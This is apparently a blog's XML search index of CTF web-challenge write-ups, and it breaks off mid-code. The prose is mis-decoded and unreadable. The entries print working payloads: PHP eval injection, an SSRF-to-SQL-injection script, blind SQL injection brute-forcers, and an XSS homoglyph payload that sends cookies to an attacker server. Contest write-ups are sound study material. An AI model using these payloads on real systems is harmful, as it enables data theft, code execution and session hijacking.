<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>DAS X å‰æ—å·¥å¸ˆ</title>
    <link href="/2021/10/29/DAS/"/>
    <url>/2021/10/29/DAS/</url>
    
    <content type="html"><![CDATA[<h2 id="è¿·è·¯çš„é­”æ³•å°‘å¥³"><a href="#è¿·è·¯çš„é­”æ³•å°‘å¥³" class="headerlink" title="è¿·è·¯çš„é­”æ³•å°‘å¥³"></a>è¿·è·¯çš„é­”æ³•å°‘å¥³</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);extract($_GET);error_reporting(<span class="hljs-number">0</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">String2Array</span>(<span class="hljs-params">$data</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span>($data == <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>();    @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$array = <span class="hljs-subst">$data</span>;&quot;</span>);    <span class="hljs-keyword">return</span> $array;&#125;<span class="hljs-keyword">if</span>(is_array($attrid) &amp;&amp; is_array($attrvalue))&#123;        $attrstr .= <span class="hljs-string">&#x27;array(&#x27;</span>;        $attrids = count($attrid);        <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i&lt;$attrids; $i++)        &#123;            $attrstr .= <span class="hljs-string">&#x27;&quot;&#x27;</span>.intval($attrid[$i]).<span class="hljs-string">&#x27;&quot;=&gt;&#x27;</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>.$attrvalue[$i].<span class="hljs-string">&#x27;&quot;&#x27;</span>;            <span class="hljs-keyword">if</span>($i &lt; $attrids<span class="hljs-number">-1</span>)            &#123;                $attrstr .= <span class="hljs-string">&#x27;,&#x27;</span>;            &#125;        &#125;        $attrstr .= <span class="hljs-string">&#x27;);&#x27;</span>;&#125;String2Array($attrstr);</code></pre><p>çªç ´ç‚¹åœ¨<code>attrvalue</code>ä¸Š</p><p>payloadï¼š<code>?attrid[]=&amp;attrvalue[]=1&quot;,11=&gt;phpinfo(),&quot;11&quot;=&gt;&quot;2</code></p><p>flagåœ¨<code>phpinfo()</code>ä¸­</p><p>é€šè¿‡é—­åˆåŒå¼•å·è®©<code>eval</code>æ‰§è¡Œå‘½ä»¤</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>sqli</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>sqli</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é¹¤åŸæ¯</title>
    <link href="/2021/10/10/%E9%B9%A4%E5%9F%8E%E6%9D%AF/"/>
    <url>/2021/10/10/%E9%B9%A4%E5%9F%8E%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="middle-magic"><a href="#middle-magic" class="headerlink" title="middle_magic"></a>middle_magic</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    highlight_file(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./flag.php&quot;</span>;    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./result.php&quot;</span>;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &amp;&amp; strlen($_GET[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &lt; <span class="hljs-number">20</span>)&#123;        $aaa = preg_replace(<span class="hljs-string">&#x27;/^(.*)level(.*)$/&#x27;</span>, <span class="hljs-string">&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;</span>, $_GET[<span class="hljs-string">&#x27;aaa&#x27;</span>]);        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/pass_the_level_1#/&#x27;</span>, $aaa))&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 2&quot;</span>;                        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])) &#123;                <span class="hljs-keyword">if</span> ($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>] == $_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;            <span class="hljs-comment">// START FORM PROCESSING    </span>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>]) === sha1($_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>]))&#123;                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;                    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;level_3&#x27;</span>])) &#123;                        $level_3 = json_decode($_POST[<span class="hljs-string">&#x27;level_3&#x27;</span>]);                                                <span class="hljs-keyword">if</span> ($level_3-&gt;result == $result) &#123;                                                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success:&quot;</span>.$flag;                        &#125;                        <span class="hljs-keyword">else</span> &#123;                            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you never beat me!&quot;</span>;                        &#125;                    &#125;                    <span class="hljs-keyword">else</span>&#123;                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;out&quot;</span>;                    &#125;                &#125;                <span class="hljs-keyword">else</span>&#123;                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);                &#125;            <span class="hljs-comment">// perform validations on the form data</span>            &#125;            <span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;</span>;            &#125;        &#125;                <span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonono!&#x27;</span>;        &#125;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;    &#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payload:</p><pre><code>?aaa=%0apass_the_level_1%23admin[]=1&amp;root_pwd[]=2&amp;level_3=&#123;&quot;result&quot;:true&#125;</code></pre><h2 id="EasyP"><a href="#EasyP" class="headerlink" title="EasyP"></a>EasyP</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>; <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, $_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;  highlight_file(basename($_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));  <span class="hljs-keyword">exit</span>();&#125;$secret = bin2hex(random_bytes(<span class="hljs-number">64</span>));<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;  $guess = (<span class="hljs-keyword">string</span>) $_POST[<span class="hljs-string">&#x27;guess&#x27;</span>];  <span class="hljs-keyword">if</span> (hash_equals($secret, $guess)) &#123;    $message = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;  &#125; <span class="hljs-keyword">else</span> &#123;    $message = <span class="hljs-string">&#x27;Wrong.&#x27;</span>;  &#125;&#125;<span class="hljs-meta">?&gt;</span>&lt;!doctype html&gt;&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;  &lt;head&gt;    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;    &lt;title&gt;Can you guess it?&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;h1&gt;Can you guess it?&lt;/h1&gt;    &lt;p&gt;<span class="hljs-keyword">If</span> your guess is correct, I<span class="hljs-string">&#x27;ll give you the flag.&lt;/p&gt;</span><span class="hljs-string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span><span class="hljs-string">    &lt;hr&gt;</span><span class="hljs-string">&lt;?php if (isset($message)) &#123; ?&gt;</span><span class="hljs-string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span><span class="hljs-string">&lt;?php &#125; ?&gt;</span><span class="hljs-string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span><span class="hljs-string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span><span class="hljs-string">      &lt;input type=&quot;submit&quot;&gt;</span><span class="hljs-string">    &lt;/form&gt;</span><span class="hljs-string">  &lt;/body&gt;</span><span class="hljs-string">&lt;/html&gt;</span></code></pre><p>é€šè¿‡<code>highlight_file</code>è¯»å–<code>config.php</code><br>ä½†è¢«è¿‡äº†ï¼Œéœ€è¦ä¸ªå­—ç¬¦ç»•è¿‡*çš„åŒ¹é…</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params">$str</span>)</span>&#123;    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, $str);&#125;<span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; <span class="hljs-number">255</span>; $i++)&#123;    $s = <span class="hljs-string">&#x27;/index.php/config.php/&#x27;</span>.chr($i);    <span class="hljs-keyword">if</span>(!check($s))&#123;        $t = basename(<span class="hljs-string">&#x27;/index.php/config.php/&#x27;</span>.chr($i));        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;$&#123;i&#125;: $&#123;t&#125;\n&quot;</span>;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>payload:<code>/index.php/config.php/%80?source</code></p><h2 id="easy-sql-1"><a href="#easy-sql-1" class="headerlink" title="easy_sql_1"></a>easy_sql_1</h2><p>è¿›å»æœ‰ä¸ª<code>use.php</code>,ssrfï¼Œä½†<code>index.php</code>çš„è¡¨å•æäº¤ä¸äº†ï¼Œæ²¡ååº”</p><p>è¦ç”¨gopheråè®®æ‰“post<br>ç„¶åadminadminç™»å½•åå‘ç°ç»™äº†<br><code>cookie:this_is_your_cookie=YWRtaW4=</code>ï¼ŒæŠŠcookieå¸¦ä¸Š</p><p>cookieå­˜åœ¨sqlæ³¨å…¥</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quotedata=<span class="hljs-string">&quot;&quot;&quot;POST / HTTP/1.1</span><span class="hljs-string">Host: 127.0.0.1:80</span><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><span class="hljs-string">Cookie: this_is_your_cookie=LTEnKXx8dXBkYXRleG1sKDEsY29uY2F0KDEsKHNlbGVjdCBncm91cF9jb25jYXQoZmxhZykgZnJvbSBmbGFnKSwxKSwxKSM=;PHPSESSID=susn9dj4f1806v0pl5oiureek1;</span><span class="hljs-string">Content-Length: &#123;&#125;</span><span class="hljs-string"></span><span class="hljs-string">&#123;&#125;</span><span class="hljs-string">&quot;&quot;&quot;</span>payload=<span class="hljs-string">&quot;uname=admin&amp;passwd=admin&quot;</span>length=<span class="hljs-built_in">len</span>(payload)data=data.<span class="hljs-built_in">format</span>(length,payload)data=quote(data,<span class="hljs-string">&#x27;utf-8&#x27;</span>)url=<span class="hljs-string">&quot;http://182.116.62.85:28303/use.php&quot;</span>params=&#123;    <span class="hljs-string">&#x27;url&#x27;</span>:<span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+data&#125;headers=&#123;    <span class="hljs-string">&#x27;Cookie&#x27;</span>:<span class="hljs-string">&quot;PHPSESSID=8t4ppbs8ek3l5v5estgbttqtu3&quot;</span>&#125;r=requests.get(url,params=params,headers=headers)print(r.text)</code></pre><h2 id="easy-sql-2"><a href="#easy-sql-2" class="headerlink" title="easy_sql_2"></a>easy_sql_2</h2><p>WAF:</p><pre><code class="hljs php"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/select|;|creat|like|insert| |sys|drop|union|file|show|rename|handler|alter|sys|if|prepare|execute|tables|delete|where\./i&quot;</span>, $value))&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;try again!&#x27;</span>);    <span class="hljs-keyword">exit</span>();&#125;</code></pre><p>æ³¨åº“åï¼š</p><pre><code class="hljs sql">(ascii(substr(database(),&#123;i&#125;,1)))=&#123;val&#125;</code></pre><p>tablesè¢«è¿‡ï¼Œä¸èƒ½ç”¨<code>information_schema.tables</code>;</p><p>mysql8ä¸­æœ‰<code>mysql.innodb_table_stats</code>å’Œ<code>mysql.innodb_index_stats</code>;ä»¥æ­¤è·å–è¡¨å</p><pre><code class="hljs sql">admin&#x27; and ((&quot;ctf&quot;,&quot;%s&quot;,1,1,1,1,1,1)&lt;(table mysql.innodb_index_stats order by last_update desc limit 5,1))#</code></pre><p>select è¢«è¿‡ï¼Œç”¨MySQL8çš„tableè¯­å¥</p><pre><code class="hljs sql">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</code></pre><p>å¯ä»¥æŠŠ<code>table t</code>ç®€å•ç†è§£æˆ<code>select * from t</code>ï¼Œå’Œ<code>select</code>çš„åŒºåˆ«åœ¨äº</p><ul><li><code>table</code>æ€»æ˜¯æ˜¾ç¤ºè¡¨çš„æ‰€æœ‰åˆ—</li><li><code>table</code>ä¸å…è®¸ä»»ä½•çš„è¡Œè¿‡æ»¤;ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>TABLE</code>ä¸æ”¯æŒä»»ä½•<code>WHERE</code>å­å¥ã€‚<br> å¯ä»¥ç”¨æ¥ç›²æ³¨è¡¨å</li></ul><pre><code class="hljs sql">admin&#x27; and ((&quot;ctf&quot;,&quot;%s&quot;,1,1,1,1,1,1)&lt;(table mysql.innodb_index_stats order by last_update desc limit 5,1))#</code></pre><p>æ³¨æ•°æ®</p><pre><code class="hljs sql">(ascii(substr(hex((table fl11aag limit 1,1)),&#123;i&#125;,1)))=&#123;val&#125;</code></pre><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> string<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">strtohex</span>(<span class="hljs-params">s</span>):</span>    ss = <span class="hljs-string">&quot;0x&quot;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:        ss +=  <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))).replace(<span class="hljs-string">&quot;0x&quot;</span>,<span class="hljs-string">&#x27;&#x27;</span>)    <span class="hljs-keyword">return</span> ssurl=<span class="hljs-string">&quot;http://182.116.62.85:26571/login.php&quot;</span>flag=<span class="hljs-string">&quot;flag&#123;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):    <span class="hljs-comment">#for j in &quot;.-0123456789abcdefghijklmnopqrstuvwxyz0123456789&#123;|&#125;~&quot;:</span>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">19</span>,<span class="hljs-number">128</span>):        <span class="hljs-comment">#payload=&quot;-1&#x27;||((&#x27;def&#x27;,&#x27;ctf&#x27;,&#x27;fl11aag&#x27;,&#x27;&#123;&#125;&#x27;,&#x27;&#x27;,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table/**/information_schema.columns/**/limit/**/3,1))#&quot;.format(flag+j)</span>        payload=<span class="hljs-string">&quot;-1&#x27;||((binary/**/&#123;&#125;)&lt;(table/**/ctf.fl11aag/**/limit/**/1,1))#&quot;</span>.<span class="hljs-built_in">format</span>(strtohex(flag+<span class="hljs-built_in">chr</span>(j)))        data=&#123;            <span class="hljs-string">&quot;username&quot;</span>:payload,            <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>        &#125;        r=requests.post(url=url,data=data)        <span class="hljs-comment">#print(r.text)</span>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">in</span> r.text <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;try&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text:            <span class="hljs-comment">#print(r.text)</span>            <span class="hljs-comment">#print(payload)</span>            <span class="hljs-comment">#print(j)</span>            flag+=<span class="hljs-built_in">chr</span>(j<span class="hljs-number">-1</span>)            print(flag)            <span class="hljs-keyword">break</span></code></pre><h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><p><a href="http://blog.cyberpeace.cn/Spring-Web-Flow/">http://blog.cyberpeace.cn/Spring-Web-Flow/</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>é¹¤åŸæ¯</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DownUnderCTF</title>
    <link href="/2021/09/28/DownUnderCTF/"/>
    <url>/2021/09/28/DownUnderCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="Chainreaction"><a href="#Chainreaction" class="headerlink" title="Chainreaction"></a>Chainreaction</h2><p>è¿›å»åæœ‰ç™»å½•æ³¨å†Œï¼Œç™»å½•æ³¨å†Œåè¿›å…¥åˆ°ä¸ªäººä¸»é¡µ<br><img src="https://s3.bmp.ovh/imgs/2021/09/1cd2c4250830e0a1.png">      </p><p>è¿™æ ·ä¸€å¥è¯<code>Report a problem on this page and an admin will check out the page for any problems</code><br>XSSäº†å§   </p><p>å°±æ˜¯XSSåå¼¹adminçš„cookieäº†     </p><p>aboutmeé‚£é‡Œæœ‰è¿‡æ»¤<code>&lt;&gt;</code>ã€<code>script</code></p><p>dirsearchæ‰«åˆ°<code>/dev</code><br><code>Dev portal is still under construction. If you already have had account provisioned head over to /devchat or head to /admin if you are a site admin</code></p><p><code>/devchat</code><br><img src="https://s3.bmp.ovh/imgs/2021/09/9c839dfe5bda5f17.png"><br>æåˆ°Unicodeçš„é—®é¢˜      </p><p>WPä¸­aboutmeé‚£é‡Œçš„ç»•è¿‡ç”¨çš„æ˜¯UnicodeåŒå‹å­—ï¼Œåœ¨è¿™ä¸ªç½‘ç«™<code>https://www.irongeek.com/homoglyph-attack-generator.php</code>   </p><p>æ¯”å¦‚<code>&lt;</code>çš„åŒå‹å­—ï¼š<br><img src="https://s3.bmp.ovh/imgs/2021/09/453d673bc3b74b6d.png">   </p><p>ä»¥æ­¤æ¥ç»•è¿‡è¿‡æ»¤<br><code>&quot;ï¼ï¼œï¼³criptï¼alert(1)ï¼œ/ï¼³criptï¼</code>    </p><p>payload:<code>&quot;ï¼ï¼œï¼³criptï¼var i = new Image;i.src=&quot;https://[my-server-url]?&quot;+document.cookieï¼œ/ï¼³criptï¼</code>     </p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>DownUnderCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PwnThyBytes 2019 Baby_SQL</title>
    <link href="/2021/09/20/BUU95/"/>
    <url>/2021/09/20/BUU95/</url>
    
    <content type="html"><![CDATA[<h2 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h2><p>é¦–é¡µæºç ç”±æ³¨é‡Š<code>/source.zip</code></p><p><code>login.php</code>é‡Œçš„SQLè¯­å¥<br><img src="https://s3.bmp.ovh/imgs/2021/09/825f257913ec9b01.png">       </p><p>ä½†<code>index.php</code>é‡Œæœ‰è¿‡æ»¤<br><img src="https://s3.bmp.ovh/imgs/2021/09/3ebd4db23b9bee97.png">     </p><p><code>addslashes</code>å‡½æ•°ä¼šè½¬ä¹‰å­—ç¬¦<br>æœ‰ä¸ª<code>session_start()</code>å‡½æ•°<br>çœ‹WPè¯´å¯ä»¥ä¼ªé€ <code>session</code>ç›´æ¥è®¿é—®<code>login.php</code>ä»è€Œç»•è¿‡<code>index.php</code>ä¸­çš„è¿‡æ»¤</p><p><strong>åœ¨phpsessioné‡Œå¦‚æœåœ¨php.iniä¸­è®¾ç½®session.auto_start=Onï¼Œé‚£ä¹ˆPHPæ¯æ¬¡å¤„ç†PHPæ–‡ä»¶çš„æ—¶å€™éƒ½ä¼šè‡ªåŠ¨æ‰§è¡Œsession_start()ï¼Œä½†æ˜¯session.auto_starté»˜è®¤ä¸ºOffã€‚ä¸Sessionç›¸å…³çš„å¦ä¸€ä¸ªå«session.upload_progress.enabledï¼Œé»˜è®¤ä¸ºOnï¼Œåœ¨è¿™ä¸ªé€‰é¡¹è¢«æ‰“å¼€çš„å‰æä¸‹æˆ‘ä»¬åœ¨multipart POSTçš„æ—¶å€™ä¼ å…¥PHP_SESSION_UPLOAD_PROGRESSï¼ŒPHPä¼šæ‰§è¡Œsession_start()</strong>     </p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&quot;http://8fa62d49-2408-4b1a-9d2e-6cfb4016a8b0.node4.buuoj.cn:81/templates/login.php&quot;</span>files = &#123;<span class="hljs-string">&quot;file&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;a = requests.post(url=url, files=files, data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;,                  cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: <span class="hljs-string">&quot;test1&quot;</span>&#125;, params=&#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>&#125;,                  proxies=&#123;<span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>&#125;)print(a.text)</code></pre><p>ç„¶ååœ¨Burpä¸­æ”¹<code>username=1&#39;%22%20or%20sleep(4)%23</code>æˆåŠŸå»¶æ—¶    </p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> timefiles=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">&#x27;1234567&#x27;</span>&#125;url=<span class="hljs-string">&#x27;http://8fa62d49-2408-4b1a-9d2e-6cfb4016a8b0.node4.buuoj.cn:81/templates/login.php&#x27;</span>flag=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    low=<span class="hljs-number">32</span>    high=<span class="hljs-number">128</span>    mid=(low+high)//<span class="hljs-number">2</span>    <span class="hljs-keyword">while</span>(low&lt;high):        time.sleep(<span class="hljs-number">0.6</span>)        payload=<span class="hljs-string">&quot;1&#x27;\&quot; or ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        payload_table=<span class="hljs-string">&quot;1&#x27;\&quot; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ptbctf&#x27;),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        payload_column=<span class="hljs-string">&quot;1&#x27;\&quot; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag_tbl&#x27;),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        payload_data=<span class="hljs-string">&quot;1&#x27;\&quot; or ascii(substr((select group_concat(secret) from ptbctf.flag_tbl),&#123;&#125;,1))&gt;&#123;&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        a=requests.post(url,files=files,                    data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="hljs-string">&#x27;123456&#x27;</span>&#125;,                    cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:<span class="hljs-string">&#x27;test1&#x27;</span>&#125;,                    params=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;123123&#x27;</span>&#125;)        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=?p=home&quot; /&gt;&#x27;</span> <span class="hljs-keyword">in</span> a.text:            low=mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            high=mid        mid=(low+high)//<span class="hljs-number">2</span>    <span class="hljs-keyword">if</span>(mid==<span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid==<span class="hljs-number">128</span>):        <span class="hljs-keyword">break</span>    flag+=<span class="hljs-built_in">chr</span>(mid)    print(flag)</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>sqli</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>sqli</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BSidesCF 2020 Hurdles</title>
    <link href="/2021/09/10/BUU94/"/>
    <url>/2021/09/10/BUU94/</url>
    
    <content type="html"><![CDATA[<p>çœŸå°±å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€å‘—ï¼Œè¿™ä¹ˆå¤šå±‚</p><p><a href="https://blog.csdn.net/cjdgg/article/details/119881039">https://blog.csdn.net/cjdgg/article/details/119881039</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>å‡çŒªå¥—</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>å‡çŒªå¥—</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æå®¢å¤§æŒ‘æˆ˜ 2020 Greatphp</title>
    <link href="/2021/09/07/BUU93/"/>
    <url>/2021/09/07/BUU93/</url>
    
    <content type="html"><![CDATA[<h2 id="æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp"><a href="#æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp"></a>[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp</h2><p>ç»™äº†æºç </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;    <span class="hljs-keyword">public</span> $syc;    <span class="hljs-keyword">public</span> $lover;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>( (<span class="hljs-keyword">$this</span>-&gt;syc != <span class="hljs-keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="hljs-keyword">$this</span>-&gt;syc) === md5(<span class="hljs-keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="hljs-keyword">$this</span>-&gt;syc)=== sha1(<span class="hljs-keyword">$this</span>-&gt;lover)) )&#123;           <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;syc, $match))&#123;               <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;syc);           &#125; <span class="hljs-keyword">else</span> &#123;               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);           &#125;                   &#125;    &#125;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;    unserialize($_GET[<span class="hljs-string">&#x27;great&#x27;</span>]);&#125; <span class="hljs-keyword">else</span> &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><ul><li>åˆ©ç”¨ErroråŸç”Ÿç±»ç»•è¿‡<code>md5</code>å’Œ<code>sha1</code>      </li></ul><p>æœ¬åœ°æµ‹è¯•</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;llnn&quot;</span>,<span class="hljs-number">1</span>);$b = <span class="hljs-keyword">new</span> <span 